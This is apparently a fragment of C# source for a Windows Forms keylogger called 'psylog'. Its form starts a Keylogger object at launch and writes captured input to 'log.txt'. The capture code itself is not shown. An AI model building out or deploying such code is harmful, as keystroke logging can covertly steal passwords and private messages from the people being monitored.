namespace psylog
{
    using System.Windows.Forms;

    public partial class frmPsylog : Form
    {
        private Keylogger keylogger = new Keylogger();

        public frmPsylog(string[] args)
        {
            InitializeComponent();
            
            ParseCommandLine();
        }

        private void ParseCommandLine()
        {
            keylogger.File = "log.txt";
            keylogger.Enabled = true;
        }
    }
}